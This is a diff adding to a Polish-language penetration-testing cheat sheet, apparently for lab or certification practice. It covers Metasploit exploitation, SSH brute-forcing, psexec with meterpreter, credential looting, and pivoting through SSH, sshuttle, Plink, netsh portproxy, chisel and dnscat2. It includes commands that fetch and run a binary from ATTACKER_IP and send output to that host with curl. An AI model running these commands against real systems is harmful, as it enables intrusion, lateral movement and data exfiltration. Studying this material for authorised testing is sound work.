@@ -772,9 +772,27 @@ show options                       # wymagane parametry
 set RHOSTS $IP
 set LHOST tun0                     # możesz podać interfejs zamiast IP
 set LPORT 443
+info                               # ZAWSZE przed run: efekty uboczne, stabilność, targets, czy zostawia ślady
+check                              # nieintruzywny dry-run — potwierdź podatność ZANIM strzelisz (oszczędza próby)
 run                                # lub: exploit   (exploit -j = w tle jako job)
 ```
-> `setg` ustawia zmienną GLOBALNIE dla wszystkich modułów (`setg RHOSTS $IP`). `services -p 445 --rhosts` wrzuca hosty z bazy do RHOSTS.
+> `setg` ustawia zmienną GLOBALNIE (`setg RHOSTS $IP`). `services -p 445 --rhosts` wrzuca hosty z bazy do RHOSTS. `info` → *Module side effects* (ślady w logach/na dysku), *Available targets* (0=Automatic vs in-memory/dropper). Zmień domyślny `LPORT 4444` → 443/80. „This exploit may require manual cleanup of /tmp/..." → **posprzątaj**.
+
+**Auxiliary brute (`ssh_login`) — sam otwiera sesję + zapisuje creds do bazy:**
+```
+use auxiliary/scanner/ssh/ssh_login
+set USERNAME george ; set PASS_FILE /usr/share/wordlists/rockyou.txt
+set RHOSTS $IP ; set RPORT 2222 ; set STOP_ON_SUCCESS true ; run
+creds                              # przechwycone poświadczenia (host+usługa)
+```
+> W przeciwieństwie do Hydry — udany login OTWIERA sesję. Pamiętaj `RPORT` dla niestandardowych portów. Wzorzec działa dla `smb_login` itd. `smb_version` sam flaguje „SMB Signing Is Not Required".
+
+**Baza — darmowa powierzchnia ataku (tylko przy `db_status` Connected):**
+```
+vulns          # podatności wywnioskowane z modułów (+ CVE)
+creds          # przechwycone poświadczenia
+loot ; notes   # pobrane pliki/zrzuty (SAM, /etc/passwd)
+```
 
 ### Payloady — staged vs non-staged
 ```
@@ -825,6 +843,16 @@ use auxiliary/server/socks_proxy
 set SRVHOST 127.0.0.1
 set VERSION 5
 run -j                             # SOCKS5 na 127.0.0.1:1080 → proxychains
+```
+Po dodaniu trasy — skanuj i atakuj wewnętrzne hosty (⚠️ **przez pivot używaj bind, nie reverse** — cel wewn. nie ma trasy powrotnej do Kali):
+```
+use auxiliary/scanner/portscan/tcp
+set RHOSTS 172.16.5.200 ; set PORTS 445,3389 ; run
+use exploit/windows/smb/psexec
+set payload windows/x64/meterpreter/bind_tcp     # BIND — nie reverse_tcp!
+set SMBUser luiza ; set SMBPass 'Haslo1!'        # user musi być LOCAL ADMIN na celu
+# w meterpreterze: portfwd add -l 3389 -p 3389 -r 172.16.5.200  → xfreerdp na 127.0.0.1:3389
+# sessions -k <id> zabij · channel -l/-i żongluj shellami · route flush wyczyść trasy
 ```
 ### Resource scripts (automatyzacja)
 ```bash
@@ -1967,6 +1995,9 @@ tscon 3 /dest:rdp-tcp#6                 :: przejmij sesję ID 3 na swoją SESSIO
 
 > Scenariusz w przykładach: `1.1.1.1` = atakujący (SSH server), `2.2.2.2` = PC-1 (pivot, SSH client), `3.3.3.3` = cel wewnętrzny.
 
+> 🎯 **Drogowskaz — co po kolei:** 1) na pivocie `ip addr`+`ip route` → druga karta/podsieć, której Kali nie widzi. 2) loot configów po creds (DB/app). 3) dobierz metodę wg firewalla: **inbound otwarty** → socat / SSH `-L`/`-D` (bind na pivocie); **inbound blokowany, outbound OK** → SSH `-R`/remote-dynamic / Plink (bind na Kali); **Windows** → ssh.exe / Plink / netsh portproxy. 4) postaw tunel → **ZWERYFIKUJ** listener (`ss -ntplu`). 5) skieruj narzędzia na lokalny koniec (`proxychains` dla SOCKS; edytuj `/etc/proxychains4.conf`). 6) enumeruj (`proxychains nmap -sT -Pn -n`), złap kolejny hop, powtórz. 7) **CLEANUP:** ubij tunele, usuń binarki, na Windzie skasuj OBA — portproxy I regułę firewalla.
+> 💎 **Co wartościowe:** druga/trzecia karta i CIDR · creds z configów (reuse) · share'y widoczne tylko z wewnątrz · czy pivot ma `socat`/`ssh` (`which`, `where`) · Win-binarki w Kali `/usr/share/windows-resources/binaries/` (nc.exe, plink.exe).
+
 ## 8.1 SSH tunneling
 
 Przygotowanie usera do tunelu (na maszynie atakującej):
@@ -1989,14 +2020,35 @@ ssh tunneluser@1.1.1.1 -L *:80:127.0.0.1:80 -N
 # firewall na PC-1 (jeśli trzeba, wymaga admina):
 netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow protocol=TCP localport=80
 ```
-### Dynamic Port Forwarding + SOCKS (`-R 9050`) — skanuj całą podsieć przez pivot
+### Dynamic Port Forwarding + SOCKS — skanuj całą podsieć przez pivot
 ```bash
-# na PC-1 (reverse dynamic — nie wymaga SSH servera na Windzie):
+# REVERSE dynamic (-R 9050) — SOCKS na Kali; gdy inbound do pivota blokowany:
 ssh tunneluser@1.1.1.1 -R 9050 -N
-# SSH server startuje SOCKS na 9050. Skonfiguruj /etc/proxychains.conf (socks 127.0.0.1 9050), potem:
-proxychains curl http://pxeboot.za.tryhackme.com
-proxychains nmap -sT -Pn 3.3.3.3
+# LOCAL dynamic (-D) — SOCKS NA pivocie; gdy MASZ konto SSH na pivocie i inbound otwarty:
+ssh -N -D 0.0.0.0:9999 db_admin@10.4.50.215
+# /etc/proxychains4.conf → socks5 <IP> <port> (obniż tcp_read/connect_time_out); potem:
+proxychains smbclient -L //172.16.50.217/ -U hr_admin
+sudo proxychains nmap -vvv -sT -Pn -n --top-ports=20 172.16.50.217   # przez SOCKS TYLKO -sT -Pn
 ```
+> `proxychains` działa tylko na **dynamicznie** linkowanych binarkach (nie statyczne). SYN/raw nie przechodzi przez SOCKS → `-sT -Pn`.
+
+### sshuttle — transparentny pseudo-VPN (bez proxychains)
+```bash
+sshuttle -r db_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24   # potem NORMALNE narzędzia, bez -p/proxychains
+```
+> Wymaga root na Kali + Python3 na pivocie. Routuje TYLKO podane CIDR. Komunikaty „Failed to flush caches" są nie-fatalne.
+
+### Windows pivot — Plink / netsh portproxy / bundled ssh.exe
+```cmd
+:: Plink remote-forward (gdy brak OpenSSH; nc.exe/plink.exe w /usr/share/windows-resources/binaries/):
+cmd.exe /c echo y | plink.exe -ssh -l kali -pw <PASS> -R 127.0.0.1:9833:127.0.0.1:3389 KALI_IP
+:: netsh portproxy — natywne, zero uploadu (WYMAGA admina; usuń OBA wpisy w cleanup!):
+netsh interface portproxy add v4tov4 listenport=2222 listenaddress=<PIVOT_WAN> connectport=22 connectaddress=10.4.50.215
+netsh advfirewall firewall add rule name="pf2222" protocol=TCP dir=in localport=2222 action=allow
+:: nowoczesny Windows MA klienta OpenSSH (od 1803) → remote-dynamic jak w Linuksie:
+where ssh & ssh -N -R 9998 kali@KALI_IP
+```
+> Sam `portproxy` = port „filtered" → MUSISZ dodać regułę `advfirewall allow`. Weryfikacja: `netstat -anp TCP | find "2222"` + `netsh interface portproxy show all`. Cleanup: `netsh ... delete rule` **oraz** `portproxy del` (przeżywają reboot). Confluence loot → hashcat `-m 12001` (`{PKCS5S2}`).
 
 ## 8.2 socat (gdy nie ma SSH)
 ```bash
@@ -2027,14 +2079,17 @@ netsh advfirewall firewall add rule name="Open Port 3389" dir=in action=allow pr
 
 ### chisel przez HTTP (SOCKS w WebSocket)
 ```bash
-# Kali (server, reverse):
-chisel server --port 8080 --reverse
-# Na celu (client) — R:socks tworzy reverse SOCKS5 na 127.0.0.1:1080 u Ciebie:
-/tmp/chisel client ATTACKER_IP:8080 R:socks
-# Ruch wygląda jak zwykły HTTP/WebSocket (podejrzyj: sudo tcpdump -nvi tun0 tcp port 8080).
-# Uwaga na wersję GLIBC na celu — dobierz statyczny/pasujący binarz chisela.
-proxychains nmap -sT 172.16.5.0/24    # potem przez socks5 127.0.0.1 1080
+# Staging (cel ściąga binarz po HTTP): sudo cp $(which chisel) /var/www/html/ ; sudo systemctl start apache2
+# tail -f /var/log/apache2/access.log   ← 'GET /chisel 200' potwierdza pobranie (blind RCE nie ma stdout)
+chisel server --port 8080 --reverse                       # Kali (server, reverse)
+# Na celu (przez RCE/webshell):
+wget ATTACKER_IP/chisel -O /tmp/chisel && chmod +x /tmp/chisel
+/tmp/chisel client ATTACKER_IP:8080 R:socks > /dev/null 2>&1 &
+ss -ntplu                                                 # weryfikacja: 127.0.0.1:1080 owner chisel = SOCKS wstał
+proxychains nmap -sT 172.16.5.0/24
 ```
+> ⚠️ **GLIBC:** chisel z repo Kali (Go 1.20) pada `GLIBC_2.32 not found` na starym Ubuntu → weź oficjalny **v1.8.1** (Go 1.19) z GitHuba (`chisel -h` pokazuje wersję Go); dopasuj arch (amd64/aarch64).
+> **Debug blind-RCE** (client pada po cichu): `... R:socks &> /tmp/output; curl --data @/tmp/output http://ATTACKER_IP:8080/` → body zobaczysz w `sudo tcpdump -nvvvXi tun0 tcp port 8080` (żaden web server niepotrzebny).
 ### DNS tunneling — dnscat2 (gdy wychodzi tylko DNS)
 ```bash
 # Kali = autorytatywny NS dla kontrolowanej domeny (np. feline.corp):
@@ -2043,8 +2098,11 @@ dnscat2-server feline.corp
 ./dnscat feline.corp
 ./dnscat --dns server=ATTACKER_IP,port=53 --secret=<SECRET> feline.corp
 # W konsoli serwera:  windows → lista sesji ;  window -i 1 → wejdź ;  potem: shell / exec / listen
+# TCP port-forward przez tunel DNS (payoff — przepchnij SMB z głębi sieci):
+listen 127.0.0.1:4455 172.16.2.11:445           # [lhost:]lport rhost:rport (bind na hoście NS)
+smbclient -p 4455 -L //127.0.0.1 -U hr_admin    # narzędzie celuje w lokalny koniec
 ```
-> Setup labowy testowego NS: `sudo dnsmasq -C dnsmasq.conf -d` z `auth-zone=feline.corp`. Alternatywa: **iodine** (interfejs tun po DNS).
+> **Najpierw UDOWODNIJ drogę DNS:** `sudo dnsmasq -C dnsmasq.conf -d` (`auth-zone=feline.corp`) + `sudo tcpdump -i ens192 udp port 53`, na celu `nslookup x.feline.corp` (NXDOMAIN OK — liczy się, że zapytanie dotarło; `resolvectl flush-caches`). Sesja startuje „ENCRYPTED but NOT VALIDATED" → porównaj auth-string na obu końcach albo `--secret=<KEY>`. **Ubij `dnsmasq` przed `dnscat2-server`** (oba chcą UDP/53). Alternatywa: **iodine**.
 
 ### SSH przez łańcuch SOCKS
 ```bash
